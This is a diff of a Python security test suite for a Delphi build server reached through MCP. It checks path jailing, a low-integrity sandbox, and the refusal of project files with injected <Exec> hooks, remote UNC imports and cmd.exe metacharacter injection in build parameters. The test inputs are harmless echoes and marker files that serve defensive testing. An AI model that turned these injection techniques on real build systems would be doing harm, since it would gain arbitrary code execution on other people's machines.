@@ -24,10 +24,10 @@ open(os.path.join(OUTSIDE, 'Fuera.pas'), 'wb').write(SRC.replace('Dentro', 'Fuer
 
 env = dict(os.environ)
 env['DELPHI_MCP_ROOTS'] = INSIDE  # the jail
-# This battery exercises the RUN MECHANISM (jail + low-integrity sandbox), so
-# it opts into execution. Run is OFF by default (a compile-only server); the
-# default-off behaviour is verified separately below with its own instance.
-env['DELPHI_MCP_ALLOW_RUN'] = '1'
+# This battery exercises the RUN MECHANISM (jail + low-integrity sandbox)
+# through delphi_test, the one thing that executes on this server since
+# delphi_run was retired (2026-09-23), so it opts into tests.
+env['DELPHI_MCP_ALLOW_TESTS'] = '1'
 # Explicit git URLs need the operator's allowlist since v0.62 (an arbitrary
 # URL made the SERVER open the connection: SSRF + exfiltration). The clone
 # checks below are about the JAIL, not about the allowlist, so this battery
@@ -135,45 +135,7 @@ open(os.path.join(sneaky, 'Primo.pas'), 'wb').write(SRC.encode('cp1252'))
 out = call('delphi_read', {"path": os.path.join(sneaky, 'Primo.pas')})
 check('fuera: primo de prefijo (permitido2) vetado', denied(out), out)
 
-# --- delphi_run is OFF BY DEFAULT (compile-only server) ---------------------
-# A fresh instance WITHOUT DELPHI_MCP_ALLOW_RUN must refuse delphi_run even
-# for the full read-write stdio client, pointing to the download path instead.
-def run_disabled_by_default():
-    e = dict(os.environ)
-    e['DELPHI_MCP_ROOTS'] = INSIDE
-    e.pop('DELPHI_MCP_ALLOW_RUN', None)  # default: execution off
-    p = subprocess.Popen([EXE], env=e, stdin=subprocess.PIPE,
-                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
-                         text=True, encoding='utf-8')
-    try:
-        p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": 1,
-            "method": "initialize", "params": {"protocolVersion": "2025-06-18",
-            "capabilities": {}, "clientInfo": {"name": "x", "version": "1"}}}) + '\n')
-        p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
-            "params": {"name": "delphi_run",
-                       "arguments": {"path": os.path.join(INSIDE, 'whatever.exe')}}}) + '\n')
-        p.stdin.flush()
-        dl = time.time() + 20
-        while time.time() < dl:
-            line = p.stdout.readline()
-            if not line:
-                break
-            try:
-                m = json.loads(line)
-            except Exception:
-                continue
-            if m.get('id') == 2:
-                c = m.get('result', {}).get('content', [])
-                return c[0].get('text', '') if c else ''
-        return '(timeout)'
-    finally:
-        p.terminate()
-
-out = run_disabled_by_default()
-check('run: DESHABILITADO por defecto (server de compilacion)',
-      'deshabilitada por diseno' in out and 'delphi_package' in out, out[:200])
-
-# delphi_run: inside allowed (real console exe built on the fly), outside denied
+# a console project built on the fly (R7 below reuses it); delphi_run itself is gone
 out = call('delphi_create', {"kind": "project-console", "dir": os.path.join(INSIDE, 'Hola'),
                              "name": "Hola"})
 check('run: proyecto de prueba creado', out.startswith('CREADO'), out)
@@ -184,24 +146,26 @@ try:
 except Exception:
     ok = False
 check('run: proyecto de prueba compila', ok, out[:150])
-out = call('delphi_run', {"path": os.path.join(INSIDE, 'Hola', 'Win64', 'Debug', 'Hola.exe')}, 120)
-check('run: dentro ejecuta y captura salida', out.startswith('exit=0') and 'funcionando' in out, out[:150])
-out = call('delphi_run', {"path": os.path.join(OUTSIDE, 'Fuera.exe')})
-check('run: fuera vetado', denied(out), out[:150])
+out = call('delphi_run', {"path": os.path.join(INSIDE, 'Hola', 'Win64', 'Debug', 'Hola.exe')}, 30)
+check('run: delphi_run ya no existe (retirada 2026-09-23: una sola via de ejecucion, remote-run)',
+      'Tool not found' in out, out[:150])
 
-# --- filesystem sandbox (B0b): a run program cannot write outside its folder ---
+# --- filesystem sandbox (B0b): a program run here cannot write outside its
+#     folder. Since 2026-09-23 the only thing that runs on this server is a
+#     test project through delphi_test (AllowTests), in the same low-integrity
+#     sandbox delphi_run used to measure - so the measurement moves there.
 _q = chr(39)
 _pub = r'C:\Users\Public\PWNED_guard_test.txt'
 if os.path.exists(_pub):
     os.remove(_pub)
-call('delphi_create', {"kind": "project-console", "dir": os.path.join(INSIDE, 'Sbx'), "name": "Sbx"})
-_body = ['program Sbx;', '{$APPTYPE CONSOLE}', 'uses System.SysUtils, System.IOUtils;', 'begin',
+call('delphi_create', {"kind": "project-console", "dir": os.path.join(INSIDE, 'SbxTest'), "name": "SbxTest"})
+_body = ['program SbxTest;', '{$APPTYPE CONSOLE}', 'uses System.SysUtils, System.IOUtils;', 'begin',
          '  try TFile.WriteAllText(' + _q + _pub + _q + ', ' + _q + 'x' + _q + '); Writeln('
          + _q + 'SYSWRITE-OK' + _q + '); except Writeln(' + _q + 'sys-blocked' + _q + '); end;',
          '  try TFile.WriteAllText(' + _q + 'out.txt' + _q + ', ' + _q + 'y' + _q + '); Writeln('
          + _q + 'LOCAL-OK' + _q + '); except Writeln(' + _q + 'local-blocked' + _q + '); end;', 'end.']
-open(os.path.join(INSIDE, 'Sbx', 'Sbx.dpr'), 'w', encoding='utf-8-sig', newline='').write('\r\n'.join(_body) + '\r\n')
-out = call('delphi_build', {"project": os.path.join(INSIDE, 'Sbx', 'Sbx.dproj'),
+open(os.path.join(INSIDE, 'SbxTest', 'SbxTest.dpr'), 'w', encoding='utf-8-sig', newline='').write('\r\n'.join(_body) + '\r\n')
+out = call('delphi_build', {"project": os.path.join(INSIDE, 'SbxTest', 'SbxTest.dproj'),
                             "platform": "Win64", "config": "Debug", "target": "Build"}, 600)
 try:
     sbok = json.loads(out)['success']
@@ -212,15 +176,21 @@ if sbok:
     # R6-C: pre-create out.txt at MEDIUM integrity (this test process) in the
     # run's own folder. Without the tree relabel, the low-IL run cannot
     # overwrite a pre-existing medium file -> "local-blocked".
-    _rundir = os.path.join(INSIDE, 'Sbx', 'Win64', 'Debug')
+    _rundir = os.path.join(INSIDE, 'SbxTest', 'Win64', 'Debug')
     os.makedirs(_rundir, exist_ok=True)
     open(os.path.join(_rundir, 'out.txt'), 'w').write('preexisting-medium-integrity')
-    out = call('delphi_run', {"path": os.path.join(_rundir, 'Sbx.exe'), "timeoutms": 10000}, 60)
+    out = call('delphi_test', {"command": "run", "project": os.path.join(INSIDE, 'SbxTest', 'SbxTest.dproj'),
+                               "platform": "Win64", "nobuild": True, "timeoutms": 10000}, 60)
+    try:
+        _tj = json.loads(out)
+    except Exception:
+        _tj = {}
+    _tail = _tj.get('outputTail', '')
     check('sandbox: escritura al SISTEMA bloqueada (low integrity)',
-          'sys-blocked' in out and not os.path.exists(_pub), out[:200])
-    check('sandbox: escritura en su propia carpeta permitida', 'LOCAL-OK' in out, out[:200])
-    check('R6-C: sobrescribe un fichero MEDIO pre-existente en su cwd', 'LOCAL-OK' in out, out[:200])
-    check('sandbox: la respuesta declara sandbox=low-integrity', 'sandbox=low-integrity' in out, out[:120])
+          'sys-blocked' in _tail and not os.path.exists(_pub), out[:200])
+    check('sandbox: escritura en su propia carpeta permitida', 'LOCAL-OK' in _tail, out[:200])
+    check('R6-C: sobrescribe un fichero MEDIO pre-existente en su cwd', 'LOCAL-OK' in _tail, out[:200])
+    check('sandbox: la respuesta declara sandboxed=true', _tj.get('sandboxed') is True, out[:120])
 if os.path.exists(_pub):
     os.remove(_pub)
 out = call('delphi_fetch', {"path": OUT_PAS})
@@ -238,8 +208,8 @@ check('clone: destino fuera vetado', denied(out), out[:150])
 
 # --- R7 CRITICAL: upload a .dproj with an <Exec> hook, then build must NOT run
 #     it (the "compile-only, never execute" guarantee). Reproduces Fable's R7.
-#     The build refusal is the DEFAULT posture (AllowRun off), so the build half
-#     runs in a fresh instance WITHOUT AllowRun - this battery sets AllowRun=1 to
+#     The build refusal is the DEFAULT posture (no build scripts), so the build half
+#     runs in a fresh instance with the default switches - this battery sets AllowTests=1 to
 #     exercise the sandbox, which by design also permits build hooks. ---
 import base64 as _b64, glob as _glob
 _holad = os.path.join(INSIDE, 'Hola', 'Hola.dproj')
@@ -247,8 +217,8 @@ _marker = os.path.join(INSIDE, 'Hola', 'R7MARKER.txt')
 if os.path.exists(_marker):
     os.remove(_marker)
 
-def build_no_allowrun(project):
-    e = dict(os.environ); e['DELPHI_MCP_ROOTS'] = INSIDE; e.pop('DELPHI_MCP_ALLOW_RUN', None)
+def build_default(project):
+    e = dict(os.environ); e['DELPHI_MCP_ROOTS'] = INSIDE
     p = subprocess.Popen([EXE], env=e, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                          stderr=subprocess.DEVNULL, text=True, encoding='utf-8')
     try:
@@ -278,10 +248,9 @@ def build_no_allowrun(project):
         p.terminate()
 
 def oneshot(tool, args, env_extra=None, t=120):
-    """One fresh server instance (AllowRun OFF), one tool call, its text back.
+    """One fresh server instance (default switches), one tool call, its text back.
     env_extra lets a test flip a single security knob (e.g. AllowBuildScripts)."""
     e = dict(os.environ); e['DELPHI_MCP_ROOTS'] = INSIDE
-    e.pop('DELPHI_MCP_ALLOW_RUN', None)
     if env_extra:
         e.update(env_extra)
     p = subprocess.Popen([EXE], env=e, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
@@ -321,12 +290,12 @@ if os.path.exists(_holad):
     # R7 HIGH: upload backed the original up before truncating it
     _bk = _glob.glob(os.path.join(INSIDE, 'Hola', '__delphi-patch', '**', 'Hola.dproj'), recursive=True)
     check('R7 HIGH: upload respaldo el .dproj antes de pisarlo', len(_bk) > 0, _bk)
-    # R7 CRITICAL: a compile-only server (no AllowRun) refuses the hazardous
+    # R7 CRITICAL: a compile-only server (no AllowBuildScripts) refuses the hazardous
     # project and never runs the injected <Exec>.
     if os.path.exists(_marker):
         os.remove(_marker)
-    out = build_no_allowrun(_holad)
-    check('R7 CRITICAL: build (sin AllowRun) RECHAZA un .dproj con <Target>/<Exec>',
+    out = build_default(_holad)
+    check('R7 CRITICAL: build (sin AllowBuildScripts) RECHAZA un .dproj con <Target>/<Exec>',
           'RECHAZADO' in out, out[:200])
     check('R7 CRITICAL: el <Exec> inyectado NO se ejecuto (sin marcador)',
           not os.path.exists(_marker), _marker)
@@ -352,7 +321,7 @@ if os.path.exists(_holad):
         ('<Import Project="\\\\servidor\\share\\evil.targets" />', 'Import UNC'),
     ):
         upload_dproj(_clean.replace('</Project>', payload + '</Project>'))
-        out = build_no_allowrun(_holad)
+        out = build_default(_holad)
         check('R7 evasion (%s): build RECHAZADO' % label, 'RECHAZADO' in out, out[:160])
     # R8 CRITICAL (Fable): the payload one file away. A macro-based <Import>
     # that resolves NEXT TO the project - macro-based, so a naive macro check
@@ -377,7 +346,7 @@ if os.path.exists(_holad):
     ):
         upload_dproj(_clean.replace('</Project>',
             '<Import Project="%s" />' % macro + '</Project>'))
-        out = build_no_allowrun(_holad)
+        out = build_default(_holad)
         check('R8 CRITICAL (%s): build RECHAZADO' % label, 'RECHAZADO' in out, out[:180])
         check('R8 CRITICAL (%s): el payload importado NO se ejecuto' % label,
               not os.path.exists(_m8), _m8)
@@ -385,13 +354,13 @@ if os.path.exists(_holad):
     upload_dproj(_clean.replace('</Project>',
         '<msb:Target xmlns:msb="http://schemas.microsoft.com/developer/msbuild/2003" '
         'Name="X" BeforeTargets="Build"><msb:Exec Command="cmd /c echo x" /></msb:Target></Project>'))
-    out = build_no_allowrun(_holad)
+    out = build_default(_holad)
     check('R8: <msb:Target> con namespace tambien RECHAZADO', 'RECHAZADO' in out, out[:180])
     os.remove(_tgt)
 
     # and the untouched project still builds fine (no false positive)
     upload_dproj(_clean)
-    out = build_no_allowrun(_holad)
+    out = build_default(_holad)
     check('R7: un .dproj NORMAL sigue compilando (sin falso positivo)',
           'RECHAZADO' not in out, out[:200])
 
@@ -402,7 +371,7 @@ if os.path.exists(_holad):
     upload_dproj(_clean.replace('</Project>',
         '<Target Name="R9Info" AfterTargets="Build">'
         '<Message Text="solo un mensaje" Importance="high" /></Target></Project>'))
-    out = build_no_allowrun(_holad)
+    out = build_default(_holad)
     check('R9 FP: <Target> INERTE (solo <Message>) NO se rechaza',
           'el proyecto contiene' not in out, out[:200])
     # a <Target> that PLANTS/DELETES a file by arbitrary path IS still refused,
@@ -415,11 +384,11 @@ if os.path.exists(_holad):
     ):
         upload_dproj(_clean.replace('</Project>',
             '<Target Name="Plant" BeforeTargets="Build">' + task + '</Target></Project>'))
-        out = build_no_allowrun(_holad)
+        out = build_default(_holad)
         check('R9: <Target> con <%s> (planta/borra) RECHAZADO' % label,
               'RECHAZADO' in out and 'contiene' in out, out[:180])
-    # AllowBuildScripts is a SEPARATE opt-in from AllowRun: a trusted project
-    # with an <Exec> (e.g. signing) may build WITHOUT enabling delphi_run.
+    # AllowBuildScripts is its own opt-in: a trusted project with an <Exec>
+    # (e.g. signing) may build, and nothing else runs on the server.
     _sign = _clean.replace('</Project>',
         '<Target Name="Sign" AfterTargets="Build">'
         '<Exec Command="cmd /c echo firmado" /></Target></Project>')
@@ -429,11 +398,6 @@ if os.path.exists(_holad):
                   {'DELPHI_MCP_ALLOW_BUILD_SCRIPTS': '1'}, 600)
     check('R9: AllowBuildScripts deja compilar un <Target><Exec> de confianza',
           'el proyecto contiene' not in out, out[:200])
-    # ...but AllowBuildScripts is NOT AllowRun: delphi_run stays OFF with it.
-    out = oneshot('delphi_run', {"path": os.path.join(INSIDE, 'Hola', 'Win64', 'Debug', 'Hola.exe')},
-                  {'DELPHI_MCP_ALLOW_BUILD_SCRIPTS': '1'}, 30)
-    check('R9: AllowBuildScripts NO enciende delphi_run (sigue deshabilitado)',
-          'deshabilitada por diseno' in out, out[:200])
     upload_dproj(_clean)  # leave a clean project for later sections
 
 # --- B0c: Windows name-normalization bypasses (trailing dot/space, ADS) ---
@@ -561,7 +525,7 @@ check('gate: el duplicado no escribio el fichero', not os.path.exists(_dup), _du
 
 # --- delphi_build: platform/config/target reach a cmd.exe line -------------
 # Unquoted in "rsvars.bat && msbuild ... /p:Platform=%s", so a metacharacter
-# there is arbitrary execution that skips AllowRun, the jail AND the sandbox.
+# there is arbitrary execution that skips the jail AND the sandbox.
 _holad = os.path.join(INSIDE, 'Hola', 'Hola.dproj')
 for param, payload in (('platform', 'Win64 && cmd /c echo x > '),
                        ('config', 'Debug > '),
